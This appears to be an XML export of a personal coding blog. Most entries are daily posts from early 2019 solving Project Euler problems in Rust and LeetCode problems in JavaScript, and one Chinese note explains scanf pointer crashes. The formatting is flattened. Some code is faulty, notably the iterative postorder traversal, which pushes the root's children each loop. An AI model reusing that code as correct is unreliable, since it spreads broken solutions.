Example 2: Input: 12345 1 / \ 4 5 / \ \4 4 5 Output: 12 Note: The given binary tree has not more than 10000 nodes. The height of the tree is not more than 1000. SolutionIt&#39;s easy to come up with recursive this idea. And with more deep thinking you might find that, if we want to construct a longer path with subnode&#39;s subtree, we can just pick one subtree, and we need to maintain answer at processing. Implementation12345678910111213141516171819202122232425262728293031/** * Definition for a binary tree node. * function TreeNode(val) &#123; * this.val = val; * this.left = this.right = null; * &#125; *//** * @param &#123;TreeNode&#125; root * @return &#123;number&#125; */var longestUnivaluePath = function(root) &#123; let ans = 0; const findPath = (root) =&gt; &#123; if (root === null) return 0; let left = findPath(root.left); let right = findPath(root.right); let arrowLeft = 0; let arrowRight = 0; if (root.left !== null &amp;&amp; root.left.val === root.val) &#123; arrowLeft = left + 1; &#125; if (root.right !== null &amp;&amp; root.right.val === root.val) &#123; arrowRight = right + 1; &#125; ans = Math.max(ans, arrowLeft + arrowRight); return Math.max(arrowRight, arrowLeft); &#125;; findPath(root); return ans;&#125;;]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
        <tag>ProjectEuler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-02-04 Daily Challenge]]></title>
    <url>%2F2019-02-04-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Triangular, pentagonal, and hexagonal in Rust and LRU Cache in JavaScript. MathProblemGoldbach&#39;s other conjectureProblem 46It was proposed by Christian Goldbach that every odd composite number can be written as the sum of a prime and twice a square. 9 = 7 + 2×1^215 = 7 + 2×2^221 = 3 + 2×3^225 = 7 + 2×3^227 = 19 + 2×2^233 = 31 + 2×1^2 It turns out that the conjecture was false. What is the smallest odd composite that cannot be written as the sum of a prime and twice a square? SolutionNothing to say. Implementation12345678910111213141516171819202122232425262728293031323334353637extern crate primal;use primal::Sieve;fn main() &#123; const LIMIT: usize = 1_000_000; let sieve: Sieve = Sieve::new(LIMIT); let mut found = false; let mut cur: usize = 9; let mut ans: usize = 0; while !found &#123; while sieve.is_prime(cur) &#123; cur += 2; &#125; let bound = sieve.prime_pi(cur-1); let mut ok = false; for i in 1..(bound+1) &#123; if is_twice_a_square(cur - sieve.nth_prime(i)) &#123; ok = true; break; &#125; &#125; if !ok &#123; ans = cur; found = true; &#125; cur += 2; &#125; println!("Answer is &#123;&#125;", ans);&#125;fn is_twice_a_square(n: usize) -&gt; bool &#123; let tmp = (n/2) as f64; let tmp = tmp.sqrt(); let tmp = tmp as usize; tmp*tmp == n/2&#125; AlgorithmProblem55. Jump GameMedium Given an array of non-negative integers, you are initially positioned at the first index of the array. Each element in the array represents your maximum jump length at that position. Determine if you are able to reach the last index. Example 1: 123Input: [2,3,1,1,4]Output: trueExplanation: Jump 1 step from index 0 to 1, then 3 steps to the last index. Example 2: 1234Input: [3,2,1,0,4]Output: falseExplanation: You will always arrive at index 3 no matter what. Its maximum jump length is 0, which makes it impossible to reach the last index. SolutionSimple DP. Implementation123456789101112/** * @param &#123;number[]&#125; nums * @return &#123;boolean&#125; */var canJump = function(nums) &#123; let dp = 0; for (let i = 0; i &lt;= Math.min(nums.length-1, dp); ++i) &#123; dp = Math.max(i+nums[i], dp); if (dp &gt;= nums.length-1) return true; &#125; return false;&#125;;]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
        <tag>ProjectEuler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-02-03 Daily Challenge]]></title>
    <url>%2F2019-02-03-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Triangular, pentagonal, and hexagonal in Rust and LRU Cache in JavaScript. MathProblemTriangular, pentagonal, and hexagonalProblem 45Triangle, pentagonal, and hexagonal numbers are generated by the following formulae:| Number | Formula | ... || ---------- | --------------------- | ---- | --------------------- || Triangle | Tn=n(n+1)/2 | 1, 3, 6, 10, 15, ... || Pentagonal | Pn=n(3n−1)/2 | 1, 5, 12, 22, 35, ... || Hexagonal | Hn=n(2n−1) | 1, 6, 15, 28, 45, ... | It can be verified that $T_{285}$ = $P_{165}$ = $H_{143}$ = 40755. Find the next triangle number that is also pentagonal and hexagonal. SolutionBrute Force!!!! Implementation1234567891011121314151617use std::collections::HashSet;fn main() &#123; let mut trangular: HashSet&lt;usize&gt; = HashSet::new(); let mut pentagonal:HashSet&lt;usize&gt; = HashSet::new(); for i in 165..100000 &#123; trangular.insert(i*(i+1)/2); pentagonal.insert(i*(3*i-1)/2); &#125; for i in 144..100000 &#123; let tmp = i*(2*i-1); if trangular.contains(&amp;tmp) &amp;&amp; pentagonal.contains(&amp;tmp) &#123; println!("Answer is &#123;&#125;", tmp); return; &#125; &#125;&#125; AlgorithmProblem146. LRU CacheDesign and implement a data structure for Least Recently Used (LRU) cache. It should support the following operations: get and put. get(key) - Get the value (will always be positive) of the key if the key exists in the cache, otherwise return -1.put(key, value) - Set or insert the value if the key is not already present. When the cache reached its capacity, it should invalidate the least recently used item before inserting a new item. Follow up:Could you do both operations in O(1) time complexity? Example: 1234567891011LRUCache cache = new LRUCache( 2 /* capacity */ );cache.put(1, 1);cache.put(2, 2);cache.get(1); // returns 1cache.put(3, 3); // evicts key 2cache.get(2); // returns -1 (not found)cache.put(4, 4); // evicts key 1cache.get(1); // returns -1 (not found)cache.get(3); // returns 3cache.get(4); // returns 4 SolutionA map with count will be enough for this problem. A list will be better, but I don&#39;t know it in js. Leave it for later or... Maybe? Implementation123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051/** * @param &#123;number&#125; capacity */var LRUCache = function(capacity) &#123; this.cap = capacity; this.cnt = 0; this.container = new Map();&#125;;/** * @param &#123;number&#125; key * @return &#123;number&#125; */LRUCache.prototype.get = function(key) &#123; this.cnt += 1; if (this.container.has(key))&#123; let tmp = this.container.get(key); tmp[1] = this.cnt; return tmp[0]; &#125; return -1;&#125;;/** * @param &#123;number&#125; key * @param &#123;number&#125; value * @return &#123;void&#125; */LRUCache.prototype.put = function(key, value) &#123; this.cnt += 1; this.container.set(key, [value, this.cnt]); if (this.container.size &gt; this.cap) &#123; let mn = 1e9; let index = -1; for (const [key, val] of this.container) &#123; if (val[1] &lt; mn) &#123; mn = val[1]; index = key; &#125; &#125; this.container.delete(index); this.container.set(key, [value, this.cnt]); &#125;&#125;;/** * Your LRUCache object will be instantiated and called as such: * var obj = Object.create(LRUCache).createNew(capacity) * var param_1 = obj.get(key) * obj.put(key,value) */]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
        <tag>ProjectEuler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-02-02 Daily Challenge]]></title>
    <url>%2F2019-02-02-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Pentagon numbers in Rust and Binary Tree Postorder Traversal in JavaScript. MathProblemPentagon numbersProblem 44Pentagonal numbers are generated by the formula, $P_n=n(3n−1)/2$. The first ten pentagonal numbers are: 1, 5, 12, 22, 35, 51, 70, 92, 117, 145, ... It can be seen that$ P_4 + P_7 = 22 + 70 = 92 = P_8$. However, their difference, 70 − 22 = 48, is not pentagonal. Find the pair of pentagonal numbers, $P_j$ and $P_k$, for which their sum and difference are pentagonal and$ D = |P_k − P_j|$ is minimized; what is the value of D? Solution$$P_n = \frac{n(3n-1)}{2}=\frac{(6n-1)^2-1}{24}​$$ if $P_k-P_j =P_x$ and $P_k+P_j=P_y$ are both pentagonal numbers, so there comes $$(6k-1)^2-(6j-1)^2=(6x-1)^2-1​$$ $$(6k-1)^2+(6j-1)^2=(6y-1)^2+1$$ $$2(6k-1)^2=(6x-1)^2+(6y-1)^2$$ OK I don&#39;t know how to use these,,,,,, so just... Brute Force? Implementation1234567891011121314151617181920212223242526use std::collections::HashSet;fn main() &#123; let mut set: HashSet&lt;i64&gt; = HashSet::new(); let mut arr: [i64; 5000] = [0; 5000]; for i in 1..5001 &#123; arr[i-1] = (i*(3*i-1)/2) as i64; set.insert((i*(3*i-1)/2) as i64); &#125; let mut offset: usize = 1; let mut index: usize; let mut found: bool = false; let mut ans: i64 = 0; while offset &lt; 5000 &amp;&amp; !found &#123; index = 0; while index &lt; 5000 - offset &amp;&amp; !found &#123; if set.contains(&amp;(arr[index]+arr[index+offset])) &amp;&amp; set.contains(&amp;(arr[index+offset]-arr[index])) &#123; ans = arr[index+offset] - arr[index]; found = true; &#125; index += 1; &#125; offset += 1; &#125; println!("Answer is &#123;&#125;", ans);&#125; AlgorithmProblem145. Binary Tree Postorder TraversalGiven a binary tree, return the postorder traversal of its nodes&#39; values. Example: 12345678Input: [1,null,2,3] 1 \ 2 / 3Output: [3,2,1] Follow up: Recursive solution is trivial, could you do it iteratively? SolutionNothing to say. Implementation12345678910111213141516171819202122/** * Definition for a binary tree node. * function TreeNode(val) &#123; * this.val = val; * this.left = this.right = null; * &#125; *//** * @param &#123;TreeNode&#125; root * @return &#123;number[]&#125; */var postorderTraversal = function(root) &#123; let ans = []; const postTravel = (root) =&gt; &#123; if (root === null) return; postTravel(root.left); postTravel(root.right); ans.push(root.val); &#125;; postTravel(root); return ans;&#125;; non-recursive implementation 12345678910111213141516171819/** * @param &#123;TreeNode&#125; root * @return &#123;number[]&#125; */var postorderTraversal = function(root) &#123; if(root == null) return []; let ans = [root.val]; let s = []; s.push(root.left); s.push(root.right); while (s.length) &#123; let tmp = s.pop(); if (tmp === null) continue; ans.unshift(tmp.val); s.push(root.left); s.push(root.right); &#125; return ans;&#125;;]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
        <tag>ProjectEuler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-02-01 Daily Challenge]]></title>
    <url>%2F2019-02-01-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Sub-string divisibility in Rust and Numbers With Same Consecutive Differences in JavaScript. I also spent a few hours at Vidar Team&#39;s HGAME2019, and go through Crypto and Web Challenge. Misc is boring, RE is boring too, PWN is interesting, but DotA2 is more interesting ;D MathProblemSub-string divisibilityProblem 43The number, 1406357289, is a 0 to 9 pandigital number because it is made up of each of the digits 0 to 9 in some order, but it also has a rather interesting sub-string divisibility property. Let d1 be the 1st digit, d2 be the 2nd digit, and so on. In this way, we note the following: d2d3d4=406 is divisible by 2 d3d4d5=063 is divisible by 3 d4d5d6=635 is divisible by 5 d5d6d7=357 is divisible by 7 d6d7d8=572 is divisible by 11 d7d8d9=728 is divisible by 13 d8d9d10=289 is divisible by 17 Find the sum of all 0 to 9 pandigital numbers with this property. SolutionNothing to say. Implementation123456789101112131415161718192021222324252627282930313233343536use permutohedron::heap_recursive;fn main() &#123; let mut data: [i64; 10] = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]; let primes: [i64; 7] = [2, 3, 5, 7, 11, 13, 17]; let mut ans: i64 = 0; let mut permutations = Vec::new(); heap_recursive(&amp;mut data, |permutation| &#123; permutations.push(permutation.to_vec()) &#125;); for permutation in permutations &#123; let mut is_ok = true; for i in 1..8 &#123; if num(permutation[i], permutation[i+1], permutation[i+2]) % primes[i-1] != 0&#123; is_ok = false; &#125; &#125; if is_ok &#123; ans += numm(&amp;permutation); &#125; &#125; println!("Answer is &#123;&#125;", ans);&#125;fn num(i: i64, j: i64, k: i64) -&gt; i64 &#123; return 100*i+10*j+k;&#125;fn numm(vec: &amp;Vec&lt;i64&gt;) -&gt; i64 &#123; let mut ans = 0; for i in vec &#123; ans *= 10; ans += i; &#125; return ans;&#125; AlgorithmProblem967. Numbers With Same Consecutive DifferencesReturn all non-negative integers of length N such that the absolute difference between every two consecutive digits is K. Note that every number in the answer must not have leading zeros except for the number 0 itself. For example, 01 has one leading zero and is invalid, but 0 is valid. You may return the answer in any order. Example 1: 123Input: N = 3, K = 7Output: [181,292,707,818,929]Explanation: Note that 070 is not a valid number, because it has leading zeroes. Example 2: 12Input: N = 2, K = 1Output: [10,12,21,23,32,34,43,45,54,56,65,67,76,78,87,89,98] Note: 1 &lt;= N &lt;= 9 0 &lt;= K &lt;= 9 SolutionSimple BFS. I write two implementation and they don&#39;t come up with enough difference on performance. Implementation123456789101112131415161718192021222324252627/** * @param &#123;number&#125; N * @param &#123;number&#125; K * @return &#123;number[]&#125; */var numsSameConsecDiff = function(N, K) &#123; let ans = [1, 2, 3, 4, 5, 6, 7, 8, 9]; if (N === 1) &#123; ans.push(0); return ans; &#125; let cnt = 1; while (cnt &lt; N) &#123; cnt += 1; let sz = ans.length; while (sz) &#123; sz -= 1; let cur = ans.shift(); if (cur%10 - K &gt;= 0) ans.push(cur*10 + cur%10 - K); if (K !== 0 &amp;&amp; cur%10 + K &lt;= 9) ans.push(cur*10 + cur%10 + K); &#125; &#125; return ans;&#125;;// console.log(numsSameConsecDiff(2,1));// console.log(numsSameConsecDiff(3,7)); 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859/** * @param &#123;number&#125; N * @param &#123;number&#125; K * @return &#123;number[]&#125; */var numsSameConsecDiff = function(N, K) &#123; let ans = [1, 2, 3, 4, 5, 6, 7, 8, 9]; if (N === 1) &#123; ans.push(0); return ans; &#125; let cnt = 1; while (cnt &lt; N) &#123; cnt += 1; let sz = ans.length; while (sz) &#123; sz -= 1; let cur = ans.shift(); if (cur%10 - K &gt;= 0) ans.push(cur*10 + cur%10 - K); if (K !== 0 &amp;&amp; cur%10 + K &lt;= 9) ans.push(cur*10 + cur%10 + K); &#125; &#125; return ans;&#125;;console.log(numsSameConsecDiff(2,1));console.log(numsSameConsecDiff(3,7));/** * @param &#123;number&#125; N * @param &#123;number&#125; K * @return &#123;number[]&#125; */var numsSameConsecDiff = function(N, K) &#123; let ans = [1, 2, 3, 4, 5, 6, 7, 8, 9]; if (N === 1) &#123; ans.push(0); return ans; &#125; if (K === 0) &#123; for (let i = 0; i &lt; 9; ++i) &#123; let cur = "" + ans.shift(); ans.push(+(cur.repeat(N))); &#125; return ans; &#125; let cnt = 1; while (cnt &lt; N) &#123; cnt += 1; let sz = ans.length; while (sz) &#123; sz -= 1; let cur = ans.shift(); if (cur%10 - K &gt;= 0) ans.push(cur*10 + cur%10 - K); if (cur%10 + K &lt;= 9) ans.push(cur*10 + cur%10 + K); &#125; &#125; return ans;&#125;;]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
        <tag>ProjectEuler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-01-31 Daily Challenge]]></title>
    <url>%2F2019-01-31-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Coded triangle numbers in Rust and Minimum Height Trees in JavaScript. MathProblemCoded triangle numbersProblem 42The nth term of the sequence of triangle numbers is given by, tn = ½n(n+1); so the first ten triangle numbers are: 1, 3, 6, 10, 15, 21, 28, 36, 45, 55, ... By converting each letter in a word to a number corresponding to its alphabetical position and adding these values we form a word value. For example, the word value for SKY is 19 + 11 + 25 = 55 = t10. If the word value is a triangle number then we shall call the word a triangle word. Using words.txt (right click and &#39;Save Link/Target As...&#39;), a 16K text file containing nearly two-thousand common English words, how many are triangle words? SolutionNothing to say. Implementation12345678910111213141516171819202122232425use std::collections::HashSet;fn main() &#123; let words = ["A", "ABILITY", "ABLE", "ABOUT", "ABOVE", "ABSENCE", "ABSOLUTELY", "ACADEMIC","ACCEPT", "ACCESS", "ACCIDENT", "ACCOMPANY", "ACCORDING", "ACCOUNT", "ACHIEVE", "ACHIEVEMENT",/* ... */"YEAH", "YEAR", "YES", "YESTERDAY", "YET", "YOU", "YOUNG", "YOUR","YOURSELF", "YOUTH"]; let mut set = HashSet::new(); let mut ans = HashSet::new(); const OFFSET: usize = 'A' as usize - 1; for i in 1..20 &#123; set.insert(i*(i+1)/2); &#125; for word in words.iter() &#123; let mut tmp = 0; for c in word.chars() &#123; tmp += (c as usize) - OFFSET; &#125; if set.contains(&amp;tmp) &#123; ans.insert(word); &#125; &#125; println!("Answer is &#123;&#125;", ans.len());&#125; AlgorithmProblem310. Minimum Height TreesMedium For an undirected graph with tree characteristics, we can choose any node as the root. The result graph is then a rooted tree. Among all possible rooted trees, those with minimum height are called minimum height trees (MHTs). Given such a graph, write a function to find all the MHTs and return a list of their root labels. FormatThe graph contains n nodes which are labeled from 0 to n - 1. You will be given the number n and a list of undirected edges(each edge is a pair of labels). You can assume that no duplicate edges will appear in edges. Since all edges are undirected, [0, 1] is the same as [1, 0]and thus will not appear together in edges. Example 1 : 123456789Input: n = 4, edges = [[1, 0], [1, 2], [1, 3]] 0 | 1 / \ 2 3 Output: [1] Example 2 : 1234567891011Input: n = 6, edges = [[0, 3], [1, 3], [2, 3], [4, 3], [5, 4]] 0 1 2 \ | / 3 | 4 | 5 Output: [3, 4] Note: According to the definition of tree on Wikipedia): “a tree is an undirected graph in which any two vertices are connected by exactly one path. In other words, any connected graph without simple cycles is a tree.” The height of a rooted tree is the number of edges on the longest downward path between the root and a leaf. SolutionImage that if we take all leaf nodes, then the tree will be smaller, and there comes new leaf nodes, over and over again, until all nodes can be leaves, then there are our roots. Use topological sort can solve it. Implementation123456789101112131415161718192021222324252627282930313233343536373839404142/** * @param &#123;number&#125; n * @param &#123;number[][]&#125; edges * @return &#123;number[]&#125; */var findMinHeightTrees = function(n, edges) &#123; if (n === 1) return [0]; let G = []; let degree = new Array(n).fill(0); for (let i = 0; i &lt; n; ++i) &#123; G.push([]); &#125; for (const edge of edges) &#123; G[edge[0]].push(edge[1]); G[edge[1]].push(edge[0]); ++degree[edge[0]]; ++degree[edge[1]]; &#125; let queue = []; let rmcnt = 0; for (let i = 0; i &lt; n; ++i) &#123; if (degree[i] === 1) &#123; queue.push(i); ++rmcnt; &#125; &#125; while (rmcnt &lt; n) &#123; let cnt = queue.length; while (cnt) &#123; --cnt; let cur = queue.shift(); for (const i of G[cur]) &#123; --degree[i]; if (degree[i] === 1) &#123; queue.push(i); ++rmcnt; &#125; &#125; &#125; &#125; return queue;&#125;;]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
        <tag>ProjectEuler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ACM中一些常见的问题及原因]]></title>
    <url>%2FACM%E4%B8%AD%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81%E7%9A%84%E9%97%AE%E9%A2%98%E5%8F%8A%E5%8E%9F%E5%9B%A0%2F</url>
    <content type="text"><![CDATA[最近在 ACM 群灌水，顺便解决了一点问题，感觉可能会成为日经系列，寻思可以写个博文专门写写，正好也是对自己学习知识的检验。 我觉得这篇文章阅读方式可以按照《C语言常见问题集》，遇到问题了来看看也行，电脑阅读的时候右边应该会有个目录可以跳转，顺着读一遍也行。 文章只能慢慢更新，因为我并不想随意地对待这种难得的问题，然而工作在身并不能全身心投入。 以下内容如无特殊声明，采用C99和C++11标准。 为什么在读入的时候不加&amp;经常会 RE，但是数组名不加&amp;就没问题？这里让我们先到scanf的manual page看看描述。 这里我把关键的两段截出来，其他部分对这个问题帮助不大所以就自己看了。重点看加粗部分 The scanf() family of functions scans input according to *format* as described below. This format may contain *conversion specifications*; the results from such conversions, **if any, are stored in the locations pointed to by the *pointer* arguments that follow format**. Each pointer argument must be of a type that is appropriate for the value returned by the corresponding conversion specification. **If the number of conversion specifications in format exceeds the number of pointer arguments, the results are undefined. If the number of pointer arguments exceeds the number of conversion specifications, then the excess pointer arguments are evaluated, but are otherwise ignored.** 这里format指的是格式化字符串，简单来说就是printf/printf的第一个参数，fscanf/fprintf的第二个参数，而这个字符串里的conversion specifications（中文维基直译为转换说明）就是指指定类型的那个e/p/d/x，比如%d中的d。同时从这里可能也就能理解为什么要叫printf/scanf而不叫print/scan，因为这是print format/scan format的简写。顺便一提，格式化字符串还是一类漏洞的名称，有兴趣的话不妨搜索了解一下。 然后回到话题，看到第一处加粗的文字，也就是说，若里面有类似%d这样的参数，而且也有对应的参数（比如scanf(&quot;%d&quot;, a)；里的a就是%d对应的参数）scanf会按照格式读入数据（并将其转化为二进制表示），然后存入对应指针参数指向的地址。也就是说它把后面的参数认为是指针了。 也就是说，下面这两个代码在某个层面上来说，意思是一样的 12345678#include &lt;stdio.h&gt;int main()&#123; int a; scanf("%d", a); return 0;&#125; 123456789#include &lt;stdio.h&gt;int main()&#123; int a, tmp; scanf("%d", &amp;tmp); *(int*)a = tmp; return 0;&#125; 编译运行的结果基本是Segmentation fault (core dumped)。 这里C语言熟练的朋友就知道，局部自动(auto)变量定义时候不会隐式初始化，所以a的值是不确定的，把它直接给scanf用的结果大抵相当于向野指针指的地方写数据。所以段错误什么的很正常吧， 这里我们再进一步，做一个测试，首先我们改写程序，其次用系统工具查看一下系统调用。 1234567891011#include &lt;stdio.h&gt;int main()&#123; int a; char *st = "%d"; printf("%p", a); printf("%p", st); scanf(st, a); return 0;&#125; 1234567root@Z:/ACM_post# python -c &quot;print &apos;1234&apos;&quot; | ltrace ./a.outprintf(&quot;%p&quot;, 0x7fff) = 6printf(&quot;%p&quot;, 0x7f027c6e3004) = 14__isoc99_scanf(0x7f027c6e3004, 0x7fff, 0x7fff, 0 &lt;no return ...&gt;--- SIGSEGV (Segmentation fault) ---+++ killed by SIGSEGV +++ 唔嗯，这里我们就可以看到，a的初始值为0x7fff，最后这个值也出现在了scanf的底层调用——__isoc99_scanf里了。 那么为什么数组名又可以了呢？ 因为数组名是常量指针。 肯定有认真听课的这样回答，但是很遗憾，不是的。数组名不是指针，但是它的确被转换成了指针。具体的内容可以搜索《说出来你们可能不信，但是数组名确实不是指针常量》。但是这个东西并不太重要，如果不当语言律师也没打算深度搞C，也没有必要理解。 在函数里开不了大数组吗？我开了一个很大的全局数组，但是编译无法通过，这是为什么？为什么越界会导致 RE？为什么有时候越界不会 RE 但是会 TLE/WA？我只定义过一个 left，为什么编译器告诉我[Error] reference to &#39;left&#39; is ambiguous？如果你仔细查看报错信息，应该会看到类似 1916 3 &#123;PATH&#125; [Note] std::ios_base&amp; std::left(std::ios_base&amp;) 出现这种问题是因为引入的头文件中的变量，比如left这个是在bits/ios_base.h里，而algorithm里有count这样的函数。 这些变量通常都在有两种方法可以解决，一是不要使用using namespace std;这个语句，另一个是不要用类似left, count这样的名称。从工程角度来说，第一个做法是比较合理的。 我这样写有问题吗？为什么读入会失败？（关于整数的读入）你总是说的堆栈，是指什么？首先需要了解一些前置知识，这些前置知识能在《计算机组成原理》《操作系统》这样的书籍里找到，这里仅作简单地补充。]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>ACM</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-01-30 Daily Challenge]]></title>
    <url>%2F2019-01-30-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Pandigital prime in Rust and Repeated DNA Sequences in JavaScript. MathProblemPandigital primeProblem 41We shall say that an n-digit number is pandigital if it makes use of all the digits 1 to n exactly once. For example, 2143 is a 4-digit pandigital and is also prime. What is the largest n-digit pandigital prime that exists? SolutionSo many pandigital problems... Implementation1234567891011121314151617181920212223242526272829303132333435363738extern crate primal;use primal::StreamingSieve;use primal::Primes;fn main() &#123; let mut ans = 0; let up_bd = StreamingSieve::prime_pi(1_000_000_000usize); for i in Primes::all().take(up_bd) &#123; if is_pandigital(i) &#123; println!("&#123;&#125;", i); ans = i; &#125; &#125; println!("Answer is &#123;&#125;", ans);&#125;fn is_pandigital(n: usize) -&gt; bool &#123; // println!("n = &#123;&#125;", n); let l = n.to_string().len(); for i in 1..(l+1) &#123; let mut tmp = n; let mut is_ok = false; while tmp != 0 &#123; if tmp % 10 == i &amp;&amp; is_ok == false &#123; is_ok = true &#125; else if tmp % 10 == i &amp;&amp; is_ok == true &#123; return false; &#125; // println!("&#123;&#125;", tmp); tmp /= 10; &#125; if !is_ok &#123; return false; &#125; &#125; true&#125; AlgorithmProblem187. Repeated DNA SequencesAll DNA is composed of a series of nucleotides abbreviated as A, C, G, and T, for example: &quot;ACGAATTCCG&quot;. When studying DNA, it is sometimes useful to identify repeated sequences within the DNA. Write a function to find all the 10-letter-long sequences (substrings) that occur more than once in a DNA molecule. Example: 123Input: s = &quot;AAAAACCCCCAAAAACCCCCCAAAAAGGGTTT&quot;Output: [&quot;AAAAACCCCC&quot;, &quot;CCCCCAAAAA&quot;] SolutionNothing to say. Implementation1234567891011121314/** * @param &#123;string&#125; s * @return &#123;string[]&#125; */var findRepeatedDnaSequences = function(s) &#123; let set = new Set(); let ans = new Set(); for (let i = 0; i &lt;= s.length-10; ++i) &#123; let tmp = s.substr(i, 10); if (set.has(tmp)) ans.add(tmp); set.add(tmp); &#125; return Array.from(ans);&#125;;]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
        <tag>ProjectEuler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-01-29 Daily Challenge]]></title>
    <url>%2F2019-01-29-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Champernowne&#39;s constant in Rust and Sudoku SolverIs Subsequence in JavaScript. I need more practice to write my own Dancing Link is JS. MathProblemChampernowne&#39;s constantProblem 40An irrational decimal fraction is created by concatenating the positive integers: 0.123456789101112131415161718192021... It can be seen that the 12th digit of the fractional part is 1. If d**n represents the nth digit of the fractional part, find the value of the following expression. d1 × d10 × d100 × d1000 × d10000 × d100000 × d1000000 SolutionNothing to say. Implementation12345678910111213141516171819202122232425fn main() &#123; let mut ans = 1; for i in 0..7 &#123; ans *= getdigit(10i32.pow(i)); &#125; println!("Answer is &#123;&#125;", ans);&#125;fn getdigit(n: i32) -&gt; i32 &#123; let mut cur: i32 = 0; let mut s: i32 = 0; let mut index = 0; while s &lt; n &#123; cur = s; index += 1; s += 9*10i32.pow(index as u32 - 1) * (index as i32); &#125; let h = n - cur - 1; let t = 10i32.pow(index-1) + h / (index as i32); let p = (h % (index as i32)) as usize; let ans = t.to_string().as_bytes()[p]; let ans = ans as char; let ans = ans.to_digit(10).unwrap(); ans as i32&#125; AlgorithmProblem392. Is SubsequenceMedium Given a string s and a string t, check if s is subsequence of t. You may assume that there is only lower case English letters in both s and t. t is potentially a very long (length ~= 500,000) string, and s is a short string (&lt;=100). A subsequence of a string is a new string which is formed from the original string by deleting some (can be none) of the characters without disturbing the relative positions of the remaining characters. (ie, &quot;ace&quot; is a subsequence of &quot;abcde&quot;while &quot;aec&quot; is not). Example 1:s = &quot;abc&quot;, t = &quot;ahbgdc&quot; Return true. Example 2:s = &quot;axc&quot;, t = &quot;ahbgdc&quot; Return false. Follow up:If there are lots of incoming S, say S1, S2, ... , Sk where k &gt;= 1B, and you want to check one by one to see if T has its subsequence. In this scenario, how would you change your code? Credits:Special thanks to @pbrother for adding this problem and creating all test cases. SolutionNothing to say. Implementation123456789101112131415/** * @param &#123;string&#125; s * @param &#123;string&#125; t * @return &#123;boolean&#125; */var isSubsequence = function(s, t) &#123; let cur = 0; for (let i = 0; i &lt; t.length &amp;&amp; cur &lt; s.length; ++i) &#123; if (t.charAt(i) === s.charAt(cur)) ++cur; &#125; return cur === s.length;&#125;;// console.log(isSubsequence("abc","ahbgdc"));// console.log(isSubsequence("axc","ahbgdc"));]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
        <tag>ProjectEuler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-01-28 Daily Challenge]]></title>
    <url>%2F2019-01-28-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Integer right triangles in Rust and Implement Magic Dictionary in JavaScript. MathProblemInteger right trianglesProblem 39If p is the perimeter of a right angle triangle with integral length sides, {a,b,c}, there are exactly three solutions for p = 120. {20,48,52}, {24,45,51}, {30,40,50} For which value of p ≤ 1000, is the number of solutions maximised? SolutionNothing to say. Implementation12345678910111213141516171819202122232425262728fn main() &#123; let mut ans = 0; let mut cnt = 0; for i in 12..1001 &#123; let mut tmp = 0; for j in 1..i &#123; for k in (2..i).rev() &#123; let l = i-j-k; if k &lt;= j &#123; break; &#125; if l &lt;= k &#123; continue; &#125; // println!("&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;", i, j, k, l); if l*l == j*j+k*k &#123; tmp += 1; &#125; &#125; &#125; if tmp &gt; cnt &#123; ans = i; cnt = tmp; &#125; // println!("&#123;&#125;, &#123;&#125;", i, tmp); &#125; println!("Answer is &#123;&#125;", ans);&#125; AlgorithmProblem676. Implement Magic DictionaryImplement a magic directory with buildDict, and searchmethods. For the method buildDict, you&#39;ll be given a list of non-repetitive words to build a dictionary. For the method search, you&#39;ll be given a word, and judge whether if you modify exactly one character into another character in this word, the modified word is in the dictionary you just built. Example 1: 12345Input: buildDict([&quot;hello&quot;, &quot;leetcode&quot;]), Output: NullInput: search(&quot;hello&quot;), Output: FalseInput: search(&quot;hhllo&quot;), Output: TrueInput: search(&quot;hell&quot;), Output: FalseInput: search(&quot;leetcoded&quot;), Output: False Note: You may assume that all the inputs are consist of lowercase letters a-z. For contest purpose, the test data is rather small by now. You could think about highly efficient algorithm after the contest. Please remember to RESET your class variables declared 